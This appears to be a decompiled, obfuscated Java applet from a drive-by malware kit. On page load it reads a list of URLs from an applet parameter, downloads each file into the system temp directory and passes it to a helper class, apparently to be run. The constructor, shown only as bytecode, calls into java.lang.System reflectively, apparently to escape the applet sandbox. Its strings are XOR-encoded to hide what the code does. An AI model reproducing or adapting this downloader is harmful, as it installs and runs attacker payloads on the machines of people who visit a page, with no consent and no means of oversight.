import java.net.URL;
import java.io.InputStream;
import java.util.HashSet;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class r extends Applet
{
    public JList ALLATORI_DEMO;
    
    public FileOutputStream ALLATORI_DEMO(final String a2) {
        try {
            return new FileOutputStream(a2);
        }
        catch (Exception a2) {
            return null;
        }
    }
    
    public HashSet ALLATORI_DEMO() {
        return new HashSet();
    }
    
    public static String M(final String a) {
        final int n = (0x3 ^ 0x5) << 4 ^ 0x5;
        final int n2 = (0x3 ^ 0x5) << 3;
        final int length = a.length();
        final char[] array = new char[length];
        int n3;
        int i = n3 = length - 1;
        final char[] array2 = array;
        final char c = (char)n2;
        final int n4 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n5 = n3;
            final char char1 = a.charAt(n5);
            --n3;
            array3[n5] = (char)(char1 ^ n4);
            if (n3 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n6 = n3;
            final char c2 = (char)(a.charAt(n6) ^ c);
            --n3;
            array4[n6] = c2;
            i = n3;
        }
        return new String(array2);
    }
    
    public r() {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     0: aload_0         /* a */
        //     1: invokespecial   java/applet/Applet.<init>:()V
        //     4: new             Ljava/lang/StringBuffer;
        //     7: dup            
        //     8: ldc             "\u001dxM"
        //    10: invokestatic    q.F:(Ljava/lang/String;)Ljava/lang/String;
        //    13: invokestatic    q.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    16: invokestatic    q.K:(Ljava/lang/String;)Ljava/lang/String;
        //    19: invokespecial   java/lang/StringBuffer.<init>:(Ljava/lang/String;)V
        //    22: ldc             "r4u"
        //    24: invokestatic    r.F:(Ljava/lang/String;)Ljava/lang/String;
        //    27: invokestatic    q.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    30: invokestatic    r.M:(Ljava/lang/String;)Ljava/lang/String;
        //    33: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //    36: ldc             "*!L\u001e|\u000e"
        //    38: invokestatic    q.F:(Ljava/lang/String;)Ljava/lang/String;
        //    41: invokestatic    q.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    44: invokestatic    q.K:(Ljava/lang/String;)Ljava/lang/String;
        //    47: iconst_2       
        //    48: invokevirtual   java/lang/String.substring:(I)Ljava/lang/String;
        //    51: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //    54: ldc             "#h%x"
        //    56: invokestatic    r.F:(Ljava/lang/String;)Ljava/lang/String;
        //    59: invokestatic    q.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    62: invokestatic    r.M:(Ljava/lang/String;)Ljava/lang/String;
        //    65: ldc             ",J,OP6"
        //    67: invokestatic    q.F:(Ljava/lang/String;)Ljava/lang/String;
        //    70: invokestatic    q.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    73: invokestatic    q.K:(Ljava/lang/String;)Ljava/lang/String;
        //    76: iconst_5       
        //    77: invokevirtual   java/lang/String.substring:(I)Ljava/lang/String;
        //    80: invokevirtual   java/lang/String.concat:(Ljava/lang/String;)Ljava/lang/String;
        //    83: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //    86: ldc             "m\u001a`?`"
        //    88: invokestatic    r.F:(Ljava/lang/String;)Ljava/lang/String;
        //    91: invokestatic    q.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    94: invokestatic    r.M:(Ljava/lang/String;)Ljava/lang/String;
        //    97: iconst_2       
        //    98: invokevirtual   java/lang/String.substring:(I)Ljava/lang/String;
        //   101: ldc             "\u001cz\t"
        //   103: invokestatic    q.F:(Ljava/lang/String;)Ljava/lang/String;
        //   106: invokestatic    q.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   109: invokestatic    q.K:(Ljava/lang/String;)Ljava/lang/String;
        //   112: invokevirtual   java/lang/String.concat:(Ljava/lang/String;)Ljava/lang/String;
        //   115: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   118: iconst_3       
        //   119: invokevirtual   java/lang/StringBuffer.substring:(I)Ljava/lang/String;
        //   122: astore_1       
        //   123: new             Lh;
        //   126: dup            
        //   127: ldc             Ljava/lang/System;.class
        //   129: aload_1        
        //   130: iconst_1       
        //   131: anewarray       Ljava/lang/Object;
        //   134: iconst_1       
        //   135: dup            
        //   136: iconst_1       
        //   137: dup            
        //   138: iconst_1       
        //   139: dup            
        //   140: pop2           
        //   141: pop2           
        //   142: pop2           
        //   143: invokespecial   h.<init>:(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)V
        //   146: astore_1       
        //   147: aload_0         /* a */
        //   148: invokevirtual   r.ALLATORI_DEMO:()Ljava/util/HashSet;
        //   151: dup            
        //   152: astore_2       
        //   153: aload_1        
        //   154: invokevirtual   java/util/HashSet.add:(Ljava/lang/Object;)Z
        //   157: new             Lk;
        //   160: dup            
        //   161: aload_0         /* a */
        //   162: aload_2        
        //   163: invokespecial   k.<init>:(Lr;Ljava/util/HashSet;)V
        //   166: astore_1       
        //   167: pop            
        //   168: new             Ljavax/swing/JList;
        //   171: aload_0         /* a */
        //   172: dup_x1         
        //   173: dup            
        //   174: pop2           
        //   175: dup            
        //   176: iconst_1       
        //   177: anewarray       Ljava/lang/Object;
        //   180: iconst_1       
        //   181: dup            
        //   182: iconst_1       
        //   183: dup            
        //   184: iconst_1       
        //   185: dup            
        //   186: pop2           
        //   187: pop2           
        //   188: pop2           
        //   189: dup            
        //   190: iconst_0       
        //   191: aload_1        
        //   192: aastore        
        //   193: invokespecial   javax/swing/JList.<init>:([Ljava/lang/Object;)V
        //   196: putfield        r.ALLATORI_DEMO:Ljavax/swing/JList;
        //   199: aload_0         /* a */
        //   200: dup            
        //   201: getfield        r.ALLATORI_DEMO:Ljavax/swing/JList;
        //   204: invokevirtual   r.add:(Ljava/awt/Component;)Ljava/awt/Component;
        //   207: pop            
        //   208: return         
        //    LocalVariableTable:
        //  Start  Length  Slot  Name  Signature
        //  -----  ------  ----  ----  ---------
        //  0      209     0     a     Lr;
        // 
        // The error that occurred was:
        // 
        // java.lang.NullPointerException
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.convertType(AstBuilder.java:324)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.convertType(AstBuilder.java:153)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformCall(AstMethodBodyBuilder.java:1120)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:1010)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformNode(AstMethodBodyBuilder.java:392)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformBlock(AstMethodBodyBuilder.java:333)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:294)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:757)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createConstructor(AstBuilder.java:692)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:529)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:499)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:141)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:130)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:105)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:317)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:238)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:138)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    public static String k(final String a) {
        final int n = (0x3 ^ 0x5) << 3 ^ (0x3 ^ 0x5);
        final int n2 = 3;
        final int n3 = n2 << n2 ^ 0x4;
        final int length = a.length();
        final char[] array = new char[length];
        int n4;
        int i = n4 = length - 1;
        final char[] array2 = array;
        final int n5 = n3;
        final char c = (char)n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n6 = n4;
            final char c2 = (char)(a.charAt(n6) ^ c);
            --n4;
            array3[n6] = c2;
            if (n4 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n7 = n4;
            final char char1 = a.charAt(n7);
            --n4;
            array4[n7] = (char)(char1 ^ n5);
            i = n4;
        }
        return new String(array2);
    }
    
    public static String F(final String a) {
        final int n = 1 << 3 ^ (0x3 ^ 0x5);
        final int length = a.length();
        final char[] array = new char[length];
        final boolean b = true;
        int n2;
        int i = n2 = length - 1;
        final char[] array2 = array;
        final boolean b2 = b;
        final int n3 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n4 = n2;
            final char char1 = a.charAt(n4);
            --n2;
            array3[n4] = (char)(char1 ^ n3);
            if (n2 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n5 = n2;
            final char c = (char)(a.charAt(n5) ^ (b2 ? 1 : 0));
            --n2;
            array4[n5] = c;
            i = n2;
        }
        return new String(array2);
    }
    
    @Override
    public void start() {
        super.start();
        try {
            final String[] split = this.getParameter(M(q.ALLATORI_DEMO(F("t#m")))).split(q.K(q.ALLATORI_DEMO(q.F("Z<X"))));
            String s2;
            final String s = s2 = System.getProperty(M(q.ALLATORI_DEMO(F(";`'`\u007fh>/%l!e8s"))));
            if (s.charAt(s.length() - 1) != '\\') {
                s2 = new StringBuilder().insert(0, s2).append(q.K(q.ALLATORI_DEMO("D"))).toString();
            }
            Integer n2;
            Integer n3;
            Integer n4;
            for (Integer n = n2 = 0; n < split.length && split[n2].length() != 0; n2 = (n3 = n2) + 1, n4 = n3, n = n2) {
                final String string = new StringBuilder().insert(0, s2).append(M(q.ALLATORI_DEMO(q.F("y\u001f")))).append(n2).append(new StringBuilder().insert(0, M(q.ALLATORI_DEMO(q.F("p\u001fu\u001fyBq\u0014"))).substring(5)).append(q.K(q.ALLATORI_DEMO(F("s")))).toString()).toString();
                final InputStream k = this.K(split[n2]);
                final FileOutputStream allatori_DEMO = this.ALLATORI_DEMO(string);
                final byte[] array = new byte[1024];
                InputStream inputStream = k;
                byte[] array2 = array;
                int read;
                while ((read = inputStream.read(array2, 0, array.length)) != -1) {
                    inputStream = k;
                    allatori_DEMO.write(array2 = array, 0, read);
                }
                k.close();
                allatori_DEMO.close();
                new c().ALLATORI_DEMO(string);
            }
            this.K(new StringBuilder().insert(0, split[n2 - 1]).append("").toString()).close();
        }
        catch (Exception ex) {}
    }
    
    public InputStream K(String a2) {
        try {
            a2 = (String)new URL(a2);
            final String allatori_DEMO = q.ALLATORI_DEMO(F(";`'`\u007fo4u\u007fT\u0003M"));
            ((URL)a2).openConnection();
            return (InputStream)Class.forName(M(allatori_DEMO)).getMethod(q.K(q.ALLATORI_DEMO(q.F("p\u000bz\u0015L\u000fm\u001e~\u0016"))), (Class<?>[])new Class[0]).invoke(a2, new Object[0]);
        }
        catch (Exception a2) {
            return null;
        }
    }
}
